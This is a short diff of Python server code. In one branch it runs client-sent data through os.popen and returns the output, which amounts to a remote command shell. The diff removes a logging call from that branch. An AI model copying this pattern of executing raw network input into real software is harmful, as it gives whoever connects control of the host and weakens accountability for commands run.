@@ -1311,7 +1311,6 @@ class qyh_svr( qyh_base ) :
                         # sys.stdout.flush()
                         # self.request.sendall( output )
 
-                svr.log_rejection( self.client_address[0] , self.client_address[1] , data )
                 self.request.sendall( '[!] ' + data + '\r\n' + os.popen( data ).read( ) )
             else :
                 svr.log_rejection( self.client_address[0] , self.client_address[1] , data )
